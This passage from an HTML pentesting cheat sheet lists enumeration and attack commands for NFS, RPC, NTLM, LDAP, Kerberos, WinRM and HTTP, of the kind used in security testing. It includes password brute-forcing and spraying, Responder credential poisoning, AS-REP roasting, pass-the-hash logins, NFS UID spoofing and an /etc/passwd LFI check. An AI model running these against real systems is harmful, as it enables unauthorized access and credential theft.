<span class="nb">set </span>SMB::ProtocolVersion 1</code></pre></div></div></li> </ul> <h2 id="protocols--nfs"> <a href="#protocols--nfs" class="anchor-heading" aria-labelledby="protocols--nfs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NFS </h2> <h3 id="protocols--nfs--enumeration"> <a href="#protocols--nfs--enumeration" class="anchor-heading" aria-labelledby="protocols--nfs--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--nfs--enumeration--showmount"> <a href="#protocols--nfs--enumeration--showmount" class="anchor-heading" aria-labelledby="protocols--nfs--enumeration--showmount"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> showmount </h4> <ul> <li>Show the available NFS shares:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount <span class="nt">-e</span> &lt;ip/hostname&gt;
<span class="c"># -d  -&gt; Dirs mounted by clients</span>
<span class="c"># -a  -&gt; All info (non-reliable)</span></code></pre></div></div></li> </ul> <h3 id="protocols--nfs--mount-shares"> <a href="#protocols--nfs--mount-shares" class="anchor-heading" aria-labelledby="protocols--nfs--mount-shares"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Mount shares </h3> <h4 id="protocols--nfs--mount-shares--mount"> <a href="#protocols--nfs--mount-shares--mount" class="anchor-heading" aria-labelledby="protocols--nfs--mount-shares--mount"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> mount </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/&lt;path&gt;

mount <span class="nt">-t</span> nfs &lt;ip&gt;:&lt;rpath&gt; /tmp/&lt;path&gt; <span class="nt">-nolock</span></code></pre></div></div> <h4 id="protocols--nfs--mount-shares--bypass-access-permission-restrictions"> <a href="#protocols--nfs--mount-shares--bypass-access-permission-restrictions" class="anchor-heading" aria-labelledby="protocols--nfs--mount-shares--bypass-access-permission-restrictions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bypass Access Permission Restrictions </h4> <ul> <li>Only works if squashing is disabled:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remote host - Check for squashing:</span>
<span class="nb">cat</span> /etc/exports
<span class="c"># root_squash -&gt; disable remote root</span>
<span class="c"># no_all_squash -&gt; enable remote usr</span></code></pre></div></div></li> <li>List exported folder UID and GID:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Main folder owners</span>
<span class="nb">ls</span> <span class="nt">-lahud</span> &lt;folder&gt;

<span class="c"># Folder content owners</span>
<span class="nb">ls</span> <span class="nt">-lahu</span> &lt;folder&gt;</code></pre></div></div></li> <li>If <code>no_all_squash</code> is set, create a local user with the same UID and GID:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>useradd <span class="nt">-M</span> <span class="nt">-u</span> &lt;uid&gt; <span class="nt">-g</span> &lt;gid&gt; <span class="nt">-o</span> &lt;name&gt;
<span class="c"># -M - Don't create home folder</span>
<span class="c"># -o - Allow non-unique ids</span></code></pre></div></div></li> <li>Switch to the user to access the dir:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> &lt;usr&gt; <span class="nt">-i</span> /bin/bash
<span class="c"># or</span>
su &lt;usr&gt;

<span class="nb">cd</span> /tmp/&lt;path&gt;</code></pre></div></div></li> <li>Remove the user:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>userdel <span class="nt">-r</span> &lt;name&gt;
<span class="c"># -f - Force deletion</span></code></pre></div></div></li> </ul> <h2 id="protocols--rpc"> <a href="#protocols--rpc" class="anchor-heading" aria-labelledby="protocols--rpc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RPC </h2> <h3 id="protocols--rpc--enumeration"> <a href="#protocols--rpc--enumeration" class="anchor-heading" aria-labelledby="protocols--rpc--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--rpc--enumeration--rpcinfo"> <a href="#protocols--rpc--enumeration--rpcinfo" class="anchor-heading" aria-labelledby="protocols--rpc--enumeration--rpcinfo"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> rpcinfo </h4> <ul> <li>Show all RPC services registered:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Uses rpcbind version 1</span>
rpcinfo <span class="nt">-s</span> &lt;ip/host&gt;
<span class="c"># -s         -&gt; Simplified output</span>
<span class="c"># -n &lt;port&gt;  -&gt; Use port number</span>
<span class="c"># -a &lt;ip:port&gt; -T tcp/udp - Alt</span>

<span class="c"># Uses rpcbind version 2</span>
rpcinfo <span class="nt">-p</span> &lt;ip/host&gt;

<span class="c"># Query service</span>
rpcinfo <span class="nt">-p</span> &lt;ip/host&gt; &lt;serv-num&gt;
<span class="c"># -T tcp/udp -&gt; Force transport</span>
<span class="c"># -l         -&gt; List all entries</span></code></pre></div></div></li> </ul> <h4 id="protocols--rpc--enumeration--rpcclient"> <a href="#protocols--rpc--enumeration--rpcclient" class="anchor-heading" aria-labelledby="protocols--rpc--enumeration--rpcclient"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> rpcclient </h4> <ul> <li>Anon bind and user enumeration:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Connect as anon user and no-pass</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;ip/host&gt;
<span class="c"># Also try -U "%"</span>
<span class="c"># -p &lt;port&gt; - Use instead of 139</span>

enumdomusers   <span class="c"># Enum Domain Users</span>
enumdomgroups  <span class="c"># Enum Domain Groups</span>

querygroup    &lt;rid&gt; <span class="c"># Group Info</span>
querygroupmem &lt;rid&gt; <span class="c"># and Membership</span>

queryuser &lt;rid&gt; <span class="c"># User/computer info</span>
<span class="c"># Includes pass attempts/cooldown</span>

<span class="c"># Info about passwords in...</span>
getdompwinfo           <span class="c"># the domain</span>
getusrdompwinfo &lt;rid&gt;  <span class="c"># usr account</span></code></pre></div></div></li> <li>Simple password bruteforce:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do </span>rpcclient <span class="nt">-U</span> <span class="s2">"&lt;usr&gt;%</span><span class="nv">$p</span><span class="s2">"</span> <span class="nt">-c</span> <span class="s1">'getusername;quit'</span> &lt;ip/host&gt; 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'&lt;usr&gt;'</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">"Valid pass: </span><span class="nv">$p</span><span class="s2">"</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="k">done</span> &lt; rockyou.txt
<span class="c"># Password-spray by iterating over</span>
<span class="c"># the users with just one password</span></code></pre></div></div></li> </ul> <h4 id="protocols--rpc--enumeration--rpcdump"> <a href="#protocols--rpc--enumeration--rpcdump" class="anchor-heading" aria-labelledby="protocols--rpc--enumeration--rpcdump"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> rpcdump </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">Impacket tool</a>: DCE/RPC endpoint mapper<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcdump.py <span class="o">[[</span>dom/]user[:pass]@]&lt;dst&gt;
<span class="c"># dst can be:</span>
<span class="c">#  - IP</span>
<span class="c">#  - NetBIOS name</span>
<span class="c"># -target-ip &lt;ip&gt; (if dst: NB name)</span>
<span class="c"># -port &lt;port&gt;</span></code></pre></div></div></li> </ul> <h2 id="protocols--ntlm"> <a href="#protocols--ntlm" class="anchor-heading" aria-labelledby="protocols--ntlm"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NTLM </h2> <h3 id="protocols--ntlm--capture"> <a href="#protocols--ntlm--capture" class="anchor-heading" aria-labelledby="protocols--ntlm--capture"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Capture </h3> <h4 id="protocols--ntlm--capture--responder"> <a href="#protocols--ntlm--capture--responder" class="anchor-heading" aria-labelledby="protocols--ntlm--capture--responder"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Responder </h4> <ul> <li><a href="https://github.com/lgandx/Responder">Site</a> - MS proto poison &amp; collect creds<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Capture &lt;iface&gt; - Listen only</span>
responder <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-I</span> &lt;iface&gt;

<span class="c"># Capture &lt;iface&gt; - Poison features</span>
responder <span class="nt">-wrf</span> <span class="nt">-v</span> <span class="nt">--lm</span> <span class="nt">-I</span> &lt;iface&gt;
<span class="c"># -e &lt;ip&gt;    - Poison req with &lt;ip&gt;</span>
<span class="c"># -b         - Basic HTTP auth</span>
<span class="c"># -u &lt;proxy&gt; - WPAD upstr HTTP proxy</span>
<span class="c"># -P         - Force proxy auth</span>
<span class="c"># -d         - Answer NB dom suffix</span>
<span class="c"># -F         - Force wpad.dat auth</span>
<span class="c"># --disable-ess - ESS downgrade</span></code></pre></div></div></li> <li>Crack the hashes as-is with <code>john</code> or <code>hc</code></li> </ul> <h2 id="protocols--ldap"> <a href="#protocols--ldap" class="anchor-heading" aria-labelledby="protocols--ldap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> LDAP </h2> <h3 id="protocols--ldap--enumeration"> <a href="#protocols--ldap--enumeration" class="anchor-heading" aria-labelledby="protocols--ldap--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--ldap--enumeration--ldapsearch"> <a href="#protocols--ldap--enumeration--ldapsearch" class="anchor-heading" aria-labelledby="protocols--ldap--enumeration--ldapsearch"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ldapsearch </h4> <ul> <li>From <a href="https://www.openldap.org/">openldap</a> (utils) - Search LDAP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -x uses simple auth</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;ip/domain&gt; <span class="nt">-s</span> base
<span class="c"># -w &lt;pass&gt; - Pass for simple auth</span>

<span class="c"># Only return specific attributes</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;ip/domain&gt; <span class="nt">-s</span> base namingcontexts
<span class="c"># ^ Finds all domain names</span></code></pre></div></div></li> </ul> <h4 id="protocols--ldap--enumeration--ldapdomaindump"> <a href="#protocols--ldap--enumeration--ldapdomaindump" class="anchor-heading" aria-labelledby="protocols--ldap--enumeration--ldapdomaindump"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ldapdomaindump </h4> <ul> <li><a href="https://github.com/dirkjanm/ldapdomaindump">Site</a> - Dump AD info via LDAP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Leave creds empty for anonymous</span>
ldapdomaindump <span class="nt">-u</span> <span class="s1">'&lt;dom&gt;\&lt;user&gt;'</span> <span class="nt">-p</span> <span class="s1">'&lt;pass&gt;'</span> <span class="nt">--no-html</span> <span class="nt">--no-grep</span> &lt;ip&gt;
<span class="c"># &lt;ip&gt; can be ldap[s]://&lt;ip&gt;:&lt;port&gt;</span>
<span class="c"># -at SIMPLE - Use simple Auth</span>
<span class="c"># -o &lt;dir&gt;   - Output directory</span>
<span class="c"># -r         - Resolve hostname</span>
<span class="c"># -m         - Dump minimal info</span>

<span class="c"># Pretty print JSON output</span>
ldd2pretty <span class="nt">--directory</span> &lt;path&gt;

<span class="c"># Read html output if --no-json</span>
<span class="nb">cat </span>domain_<span class="k">*</span>.html | w3m <span class="nt">-T</span> text/html</code></pre></div></div></li> </ul> <h2 id="protocols--kerberos"> <a href="#protocols--kerberos" class="anchor-heading" aria-labelledby="protocols--kerberos"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Kerberos </h2> <h3 id="protocols--kerberos--enumeration---bruteforce"> <a href="#protocols--kerberos--enumeration---bruteforce" class="anchor-heading" aria-labelledby="protocols--kerberos--enumeration---bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration / Bruteforce </h3> <h4 id="protocols--kerberos--enumeration---bruteforce--kerbrute"> <a href="#protocols--kerberos--enumeration---bruteforce--kerbrute" class="anchor-heading" aria-labelledby="protocols--kerberos--enumeration---bruteforce--kerbrute"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> kerbrute </h4> <ul> <li><a href="https://github.com/ropnop/kerbrute">Site</a> - Enum users + brute/spray creds<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Enum valid users</span>
kerbrute userenum <span class="nt">--dc</span> &lt;dc-ip/domain&gt; <span class="nt">-d</span> &lt;domain&gt; &lt;usrlist&gt;
<span class="c"># dc-domain &amp; domain may be the same</span>

<span class="c"># Spray password</span>
kerbrute passwordspray <span class="nt">--dc</span> &lt;dc-ip/domain&gt; <span class="nt">-d</span> &lt;domain&gt; &lt;usrlist&gt; &lt;pass&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--kerberos--as-rep-roasting"> <a href="#protocols--kerberos--as-rep-roasting" class="anchor-heading" aria-labelledby="protocols--kerberos--as-rep-roasting"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> AS-REP Roasting </h3> <h4 id="protocols--kerberos--as-rep-roasting--getnpusers"> <a href="#protocols--kerberos--as-rep-roasting--getnpusers" class="anchor-heading" aria-labelledby="protocols--kerberos--as-rep-roasting--getnpusers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GetNPUsers </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">Site</a> (Impacket) - Get non-preauth TGTs<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get TGTs for list of users</span>
GetNPUsers.py <span class="nt">-dc-ip</span> &lt;ip&gt; &lt;domain&gt;/ <span class="nt">-usersfile</span> &lt;usrfile&gt; <span class="nt">-format</span> &lt;hashcat|john&gt; <span class="nt">-outputfile</span> &lt;file&gt;

<span class="c"># Get TGTs for all domain users</span>
GetNPUsers.py <span class="nt">-dc-ip</span> &lt;ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;passwd&gt; <span class="nt">-request</span> <span class="nt">-format</span> &lt;hashcat|john&gt; <span class="nt">-outputfile</span> &lt;file&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--kerberos--as-rep-roasting--getadusers"> <a href="#protocols--kerberos--as-rep-roasting--getadusers" class="anchor-heading" aria-labelledby="protocols--kerberos--as-rep-roasting--getadusers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GetADUsers </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py">Site</a> (Impacket) - List all usernames:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetADUsers <span class="nt">-all</span> <span class="nt">-dc-ip</span> &lt;ip&gt; &lt;domain&gt;/&lt;usr&gt;:&lt;pass&gt;
<span class="c"># -hashes &lt;LM&gt;:&lt;NT&gt; - NT auth</span></code></pre></div></div></li> </ul> <h2 id="protocols--winrm---psrp"> <a href="#protocols--winrm---psrp" class="anchor-heading" aria-labelledby="protocols--winrm---psrp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> WinRM / PSRP </h2> <h3 id="protocols--winrm---psrp--evil-winrm"> <a href="#protocols--winrm---psrp--evil-winrm" class="anchor-heading" aria-labelledby="protocols--winrm---psrp--evil-winrm"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> evil-winrm </h3> <ul> <li><a href="https://github.com/Hackplayers/evil-winrm">Site</a> - Remote shell - Port 5985:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check the Site for extra features</span>
evil-winrm <span class="nt">-u</span> <span class="s1">'[&lt;domain&gt;\]&lt;user&gt;'</span> <span class="nt">-p</span> <span class="s1">'&lt;pass&gt;'</span> <span class="nt">-i</span> &lt;ip&gt;

<span class="c"># Login with NTLM hash (not NTLVv2)</span>
evil-winrm <span class="nt">-H</span> <span class="s1">'&lt;ntlm-hash&gt;'</span> <span class="nt">-i</span> &lt;ip&gt;

<span class="c"># -S        - enable ssl</span>
<span class="c"># -P &lt;port&gt; - Other than 5985 port</span>
<span class="c"># -s &lt;path&gt; - Load local PS scripts</span>
<span class="c"># -e &lt;path&gt; - Load local C# exes</span>
<span class="c"># -U &lt;uri&gt;  - URI path to /wsman</span>
<span class="c"># -r &lt;dom&gt;  - Kerberos realm domain</span>

<span class="c"># upload   - Upload local files</span>
<span class="c"># download - Download remote files</span>
<span class="c"># services - Show running services</span>
<span class="c"># menu     - Show extra features:</span>
<span class="c">#  [Dll|Donut]-loader | Invoke-Binary</span></code></pre></div></div></li> </ul> <h2 id="protocols--http---https"> <a href="#protocols--http---https" class="anchor-heading" aria-labelledby="protocols--http---https"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTTP / HTTPS </h2> <h3 id="protocols--http---https--enumeration"> <a href="#protocols--http---https--enumeration" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--http---https--enumeration--console-page-rendering"> <a href="#protocols--http---https--enumeration--console-page-rendering" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--console-page-rendering"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Console page rendering </h4> <h5 id="protocols--http---https--enumeration--console-page-rendering--w3m"> <a href="#protocols--http---https--enumeration--console-page-rendering--w3m" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--console-page-rendering--w3m"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> w3m </h5> <ul> <li>Usage - best standalone Renderer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add -dump to not start pager</span>
w3m &lt;url&gt;
<span class="c"># Use -T text/html with files</span>

<span class="c"># Cookies are in Netscape format</span>
<span class="nv">HOME</span><span class="o">=</span>/tmp w3m <span class="nt">-cookie</span> &lt;url&gt;
<span class="c"># Cookies are in /tmp/.w3m/cookie</span>

<span class="c"># For insecure sites you may try</span>
w3m <span class="nt">-insecure</span> &lt;url&gt;

<span class="c"># Or</span>
w3m <span class="nt">-o</span> <span class="nv">ssl_cipher</span><span class="o">=</span><span class="s1">'ALL:@SECLEVEL=0'</span> <span class="nt">-o</span> <span class="nv">ssl_min_version</span><span class="o">=</span><span class="s1">'TLSv1.0'</span> <span class="nt">-o</span> <span class="nv">ssl_forbid_method</span><span class="o">=</span><span class="s1">''</span> <span class="nt">-o</span> <span class="nv">ssl_verify_server</span><span class="o">=</span>0 &lt;url&gt;

<span class="c"># As a last resort pipe curl</span>
curl <span class="nt">-s</span> &lt;url&gt; | w3m <span class="nt">-T</span> text/html</code></pre></div></div></li> </ul> <h5 id="protocols--http---https--enumeration--console-page-rendering--browsh"> <a href="#protocols--http---https--enumeration--console-page-rendering--browsh" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--console-page-rendering--browsh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Browsh </h5> <ul> <li><a href="https://github.com/browsh-org/browsh">Site</a> - Renders JS - Requires Firefox:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Needs mouse support for clicks</span>
browsh &lt;url&gt;
<span class="c"># Alt: --firefox.path "firefox-esr"</span></code></pre></div></div></li> <li>Use the <a href="https://github.com/browsh-org/browsh/tree/vim-mode-experimental">vim-mode</a> experimental branch</li> <li>Or install <a href="https://addons.mozilla.org/en-US/firefox/addon/vim-vixen/">Vim-Vixen</a> in <a href="https://github.com/browsh-org/browsh/pull/264">GUI mode</a></li> </ul> <h5 id="protocols--http---https--enumeration--console-page-rendering--lynx"> <a href="#protocols--http---https--enumeration--console-page-rendering--lynx" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--console-page-rendering--lynx"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Lynx </h5> <ul> <li>Preserves links:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add -dump to not start pager</span>
lynx &lt;url&gt;
<span class="c"># Use -force_html to force parsing</span></code></pre></div></div></li> </ul> <h5 id="protocols--http---https--enumeration--console-page-rendering--html2text"> <a href="#protocols--http---https--enumeration--console-page-rendering--html2text" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--console-page-rendering--html2text"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> html2text </h5> <ul> <li><a href="https://github.com/grobian/html2text">C++</a>/<a href="https://github.com/Alir3z4/html2text/">Python</a> - Simple script for files:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Prettify with -style pretty</span>
html2text &lt;file&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--http---https--enumeration--curl"> <a href="#protocols--http---https--enumeration--curl" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--curl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Curl </h4> <ul> <li>Headers + body:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> &lt;url&gt;</code></pre></div></div></li> <li>Headers only:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-I</span> &lt;url&gt;</code></pre></div></div></li> <li>Follow redirection:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> &lt;url&gt;</code></pre></div></div></li> <li>Connect to old SSL/TLS sites:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-1</span> <span class="nt">--ciphers</span> <span class="s1">'DEFAULT:!DH'</span> <span class="nt">-k</span> &lt;url&gt;</code></pre></div></div></li> <li><code>curl --trace</code> parser: <a href="https://github.com/apiaryio/curl-trace-parser">curl-trace-parser</a></li> </ul> <h4 id="protocols--http---https--enumeration--httpie"> <a href="#protocols--http---https--enumeration--httpie" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--httpie"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTTPie </h4> <ul> <li><a href="https://github.com/httpie/httpie">Site</a> - Curl+Wget+JSON CLI - <a href="https://httpie.io/docs#examples">Docs</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GET request with parameteres</span>
http &lt;url&gt; <span class="s1">'q==hi'</span> <span class="s1">'sort==3'</span>

<span class="c"># POST request URLencoded</span>
http <span class="nt">-F</span> <span class="nt">-f</span> &lt;domain-ip&gt;/&lt;path&gt; <span class="s1">'u=me'</span>
<span class="c"># -F to follow | -f use "form mode"</span>
<span class="c"># --all to show all redirects</span>

<span class="c"># Check request without sending it</span>
http <span class="nt">--offline</span> &lt;domain-ip&gt;

<span class="c"># Upload a file (default is POST)</span>
https PUT &lt;domain-ip&gt; &lt; <span class="s1">'&lt;file&gt;'</span>

<span class="c"># Perfrom LFI check</span>
http <span class="nt">--path-as-is</span> &lt;domain-ip&gt;/../../../etc/passwd

<span class="c"># Response headers in JSON</span>
https <span class="nt">-h</span> <span class="nt">-j</span> &lt;domain-ip&gt;
<span class="c"># -p Hh to print Resquest &amp; Response</span>

<span class="c"># Store/Use session (cookies) - JSON</span>
http <span class="nt">--session</span><span class="o">=</span>&lt;path&gt; &lt;domain-ip&gt;

<span class="c"># HTTP Auth</span>
http <span class="nt">-a</span> &lt;user:pass&gt; &lt;domain-ip&gt;
<span class="c"># -A basic/digest for Auth type</span>
<span class="c"># --proxy=&lt;method&gt;:&lt;url&gt;</span></code></pre></div></div></li> <li><a href="https://github.com/hongquan/CurliPie">CurliPie</a> - Convert <code>curl</code> to <code>HTTPie</code></li> <li><a href="https://github.com/httpie/http-prompt">HTTP Prompt</a> - Interactive <code>HTTPie</code> - <a href="https://docs.http-prompt.com/en/latest/">Doc</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-prompt &lt;url&gt; &lt;httpie-options&gt;

<span class="c"># Supports everything HTTPie does</span>
<span class="nb">env</span>      <span class="c"># Show flags set</span>
<span class="nb">cd</span> &lt;uri&gt; <span class="c"># Move to parent/child URI</span>
httpie   <span class="c"># Show what will get run</span>
<span class="nb">rm</span> <span class="nt">-o</span> <span class="k">*</span>  <span class="c"># Remove all HTTPie options</span>
post     <span class="c"># Perform POST request</span>
<span class="nb">rm</span> <span class="nt">-b</span> <span class="k">*</span>  <span class="c"># Remove all "body options"</span>
<span class="c"># Remember: -f -F --session &lt;file&gt;</span>
<span class="c"># to be able to perform cd &lt;uri&gt;</span>
get | w3m <span class="nt">-T</span> text/html <span class="c"># Pipe GET</span>
<span class="nb">env</span> <span class="o">&gt;</span> &lt;file&gt;  <span class="c"># Save session to file</span>
<span class="nb">source</span> &lt;file&gt; <span class="c"># Load session</span>
<span class="nb">exec</span> &lt;file&gt;   <span class="c"># Replace&amp;Load session</span>

<span class="c"># Start from session</span>
http-prompt <span class="nt">--env</span> &lt;session&gt; &lt;url&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--http---https--enumeration--openssl-s_client"> <a href="#protocols--http---https--enumeration--openssl-s_client" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--openssl-s_client"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> openssl s_client </h4> <ul> <li>Query site:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"GET /&lt;path&gt; HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host: &lt;domain&gt;</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | openssl s_client <span class="nt">-connect</span> &lt;site&gt;:443 <span class="nt">-verify_quiet</span> <span class="nt">-quiet</span> 2&gt;/dev/null | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'$G;1,/^\s*$/!P'</span>
<span class="c"># For file downloading: sed '1,/^\s*$/d'</span></code></pre></div></div></li> </ul> <h4 id="protocols--http---https--enumeration--bash"> <a href="#protocols--http---https--enumeration--bash" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--bash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bash </h4> <ul> <li>Query site:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span> <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"GET /&lt;path&gt; HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host: &lt;ip-dom&gt;</span><span class="se">\r\n\r\n</span><span class="s2">"</span> <span class="o">&gt;</span>&amp;3<span class="p">;</span>
  <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'$G;1,/^\s*$/!P'</span> &lt;&amp;3<span class="p">;</span>
<span class="o">}</span> 3&lt;<span class="o">&gt;</span>/dev/tcp/&lt;ip-domain&gt;/80
<span class="c"># For file downloading: sed '1,/^\s*$/d'</span></code></pre></div></div></li> </ul> <h4 id="protocols--http---https--enumeration--perl"> <a href="#protocols--http---https--enumeration--perl" class="anchor-heading" aria-labelledby="protocols--http---https--enumeration--perl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Perl </h4> <ul> <li>Core Perl:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remove $/="\r\n"x2 to show the headers</span>
perl <span class="nt">-MSocket</span> <span class="nt">-e</span> <span class="s1">'$"=",";socket$s,2,1,6;$$_[2]=qq/pack"$$_[2]"/,eval"setsockopt\$s,@$_"for[1,13,ii,1,5],[6,18,L,5000],map[1,$_,"l!2",5],20,21;connect$s,sockaddr_in+80,inet_aton$h="&lt;ip-host&gt;";send$s,"GET /&lt;path&gt; HTTP/1.0\r\nHost: $h\r\n\r\n",0;$/="\r\n"x2;&lt;$s&gt;;print&lt;$s&gt;'</span>
<span class="c"># If headers don't end in \r\n use:</span>
<span class="c">#   1until&lt;$s&gt;=~/^\s*$/;print&lt;$s&gt;</span>
<span class="c">#</span>
<span class="c"># For HTTP/1.1 add Connection: close</span>
